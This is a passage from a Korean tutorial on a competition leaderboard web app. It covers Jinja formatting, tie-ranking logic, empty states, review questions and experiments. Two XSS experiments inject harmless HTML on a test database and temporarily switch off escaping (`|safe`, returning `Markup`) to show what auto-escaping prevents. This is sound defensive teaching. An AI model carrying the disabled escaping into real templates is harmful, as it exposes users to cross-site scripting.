`10.5` → `"10.50"`. **소수점 둘째 자리 고정** — 표가 정렬되어 보인다.

**`row.team.name`**: Jinja는 dict의 `row["team"]`도 `row.team`으로 접근할 수 있다.
(먼저 속성을 찾고, 없으면 `__getitem__`을 시도한다)

**`allowed_extensions|join(' 또는 ')`** (submit.html):
```jinja
<label for="model_file">모델 파일 ({{ allowed_extensions|join(' 또는 ') }})</label>
```
→ "모델 파일 (.tar.gz 또는 .zip)".
**설정에서 온 값을 사람이 읽는 문장으로 만든다.** 하드코딩보다 낫다.

### **순위 표시의 버그 — 동점자 처리** ⚠️

```jinja
<td>{{ loop.index }}</td>
```

랩타임 10.00초 팀이 둘이면:
```
1위  팀A  10.00초
2위  팀B  10.00초    ← 같은 기록인데 순위가 다르다
3위  팀C  11.20초
```

**스포츠 관례(standard competition ranking)로는:**
```
1위  팀A  10.00초
1위  팀B  10.00초
3위  팀C  11.20초    ← 2위는 건너뛴다
```

**현재 구현은 `achieved_at`으로 내부 순서를 정하므로 결과가 흔들리진 않는다.**
그래도 **"같은 기록인데 순위가 다른"** 화면이 나온다.

**개선 방법:**
```python
rank = 0
prev_time = None
for i, row in enumerate(ranked, start=1):
    if row["lap_time"] != prev_time:
        rank = i
        prev_time = row["lap_time"]
    row["rank"] = rank
```
```jinja
<td>{{ row.rank }}</td>
```

> **밀리초 단위라 동점 확률이 낮지만, 대회에서 실제로 발생하면 분쟁이 된다.**
> `tests/test_leaderboard_ranking.py`에 동점 케이스를 추가할 가치가 있다.

### 빈 상태 처리

```jinja
{% if not ranked and not unranked %}
<p class="muted">아직 제출된 기록이 없습니다.</p>
{% endif %}
```

**[전공] 빈 상태(empty state)는 UI의 기본 요소다.**
표만 덩그러니 있고 아무 행도 없으면 "고장난 건가?" 싶다.
시즌 시작 직후에는 **이 화면이 대부분의 사람이 처음 보는 화면**이다.

**그리고 `_worker_status.html` 배너가 그 위에 뜬다** — "평가 서버가 중지되어 있습니다".
**빈 리더보드 + 서버 중지 안내** = 사용자가 상황을 정확히 이해한다.

---

## 8. 자가 점검 질문

**구조**
1. SSR과 SPA의 차이는? 이 프로젝트가 SSR인 이유 3가지는? `upload.js`는 그 원칙을 어기는가?
2. `/` → `/leaderboard` → `/leaderboard/3` 리다이렉트 체인의 장점과 비용은?
3. `get_open_season`이 `.limit(1)`을 쓰는 이유는? `has_active_submission`은 왜 다른 판단을 하는가?
4. 라우트 선언 순서가 잘못되면 왜 404가 아니라 422가 나는가?

**알고리즘**
5. `get_team_best`의 필터 3개는 각각 무엇을 막는가? 3번을 빼면 어떤 예외가?
6. 랩타임 `float` 를 `==` 로 비교하는 게 왜 여기선 안전한가? 일반적으로는 왜 위험한가?
7. `get_team_best`가 리더보드와 retention에서 공유되지 않으면 어떤 버그가 생기는가?
8. `_best_attempt`가 왜 필요해졌는가? 어떤 제품 문제를 푸는가?
9. `_best_attempt`가 `best_progress_percent is not None` 을 거르는 이유는? 안 거르면?
10. `ranked`와 `unranked`를 나누는 이유는? "순위 없음"과 "정보 없음"의 차이는?
11. 튜플 정렬 키가 동작하는 원리는? 안정 정렬에 의존하지 않는 이유는?
12. `total_submissions`가 `DONE`만 세는 이유는? quota와 어긋나면 무슨 일이?
13. `video_path`가 `None`이 되는 세 상황은? 안 비우면 무슨 문제가?

**템플릿**
14. `extends`와 `include`의 차이는? `_worker_status.html`이 두 화면에서 쓰이는데 컨텍스트는 어떻게 전달되나?
15. `{% block scripts %}`가 `</body>` 직전에 있고 조건부인 이유는?
16. `base.html`이 세션만 보고 관리자 링크를 표시하는데 왜 안전한가?
17. `_가짜요청` 테스트가 성립하는 이유는? 덕 타이핑이란?
18. `failure_summary`를 라우터가 아니라 Jinja 필터로 만든 이유는?
19. `FAILURE_REASON_LABELS.get(reason, reason)` 에서 기본값이 자기 자신인 이유는?

**XSS**
20. 팀명에 `<script>`를 넣으면 무슨 일이 일어나는가? 무엇이 막아주는가?
21. XSS 하나로 3단계의 은닉·잠금이 왜 무의미해지는가?
22. `failure_summary` 필터가 `Markup`이 아니라 `str`을 반환하는 것이 왜 중요한가?
23. 자동 이스케이프가 막지 못하는 4가지 문맥은?
24. `href="{{ row.video_url }}"`가 지금은 안전한 이유는? 언제 위험해지는가?
25. `data-max-bytes="{{ ... }}"` 가 인라인 `<script>var MAX = {{ ... }}</script>` 보다 안전한 이유는?

**표현**
26. 동점자 순위 표시에 어떤 문제가 있는가? 어떻게 고치는가?
27. 빈 상태 처리가 왜 UI의 기본 요소인가?

---

## 9. 실험 과제

**실험 A — XSS 방어 확인**
관리자로 팀을 등록하되 이름을 `<b>굵게</b>` 로 준다.
리더보드에서 굵게 보이는가, 태그가 글자로 보이는가?
그다음 템플릿을 `{{ row.team.name | safe }}` 로 바꾸고 다시 본다.
**차이를 눈으로 확인한 뒤 반드시 되돌린다.**

**실험 B — 필터도 이스케이프되는지 확인**
```sql
UPDATE evaluation_results SET failure_reason = '<b>hack</b>' WHERE id = 1;
```
(테스트 DB에서만) 화면에 태그가 글자로 보이는가?
그다음 `render.py`의 `failure_summary`가 `Markup(" · ".join(parts))` 를 반환하도록 바꿔보라.
**차이를 확인하고 반드시 되돌린다.**

**실험 C — 동점 상황 만들기**
```sql
UPDATE evaluation_results SET lap_time_seconds = 12.34 WHERE id IN (1, 2);
```
순위가 1, 2로 나오는가? `achieved_at` 순서대로인가?

**실험 D — 미완주 표시 확인**
```sql
UPDATE evaluation_results
SET finish_status='timeout', lap_time_seconds=NULL,
    best_progress_percent=67.8, failure_reason='immobilized'
WHERE id = 1;
```
리더보드 미완주 표에 "완주 실패 (67.8%) · 차량이 멈춤" 이 뜨는가?
그다음 `failure_reason='unknown_thing'` 으로 바꾸면? (원문이 그대로 뜨는가?)
그다음 `best_progress_percent=NULL` 로 바꾸면? ("완주 실패"만 뜨는가?)

**실험 E — 미완주 필터 제거**
`records.py`의 `if result.finish_status != FinishStatus.FINISHED: continue` 를 주석 처리하고
미완주 기록이 있는 시즌의 리더보드를 열어보라. 어떤 예외가 나는가?

**실험 F — N+1 재확인 + 해결**
```python
# app/db.py
engine = create_engine(settings.database_url, pool_pre_ping=True, future=True, echo=True)
```
리더보드를 열고 콘솔의 SELECT 개수를 센다. 그다음:
```python
from sqlalchemy.orm import selectinload
from app.models import Submission
teams = db.execute(
    select(Team).where(Team.season_id == season.id, Team.disqualified.is_(False))
    .options(selectinload(Team.submissions).selectinload(Submission.result))
).scalars().all()
```
다시 세어본다. **몇 개에서 몇 개로 줄었는가?**

**실험 G — 네비게이션 조건 확인**
```bash
PYTHONPATH=. .venv/bin/python -m pytest tests/test_admin_access.py -k 네비 -v
PYTHONPATH=. .venv/bin/python -m pytest tests/test_leaderboard_build.py tests/test_leaderboard_ranking.py -v
```
테스트를 읽고 동점 케이스를 하나 추가해보라.

**실험 H — 워커 상태 배너**
워커를 끄고 4분 뒤 리더보드와 `/submit`을 둘 다 열어보라.
**같은 배너가 두 화면에 뜨는가?** `_worker_status.html`을 고치면 둘 다 바뀌는가?

---

→ 다음: [06-worker.md](06-worker.md) — 웹과 완전히 분리된 세계, 동시성, 그리고 두 배포 모드
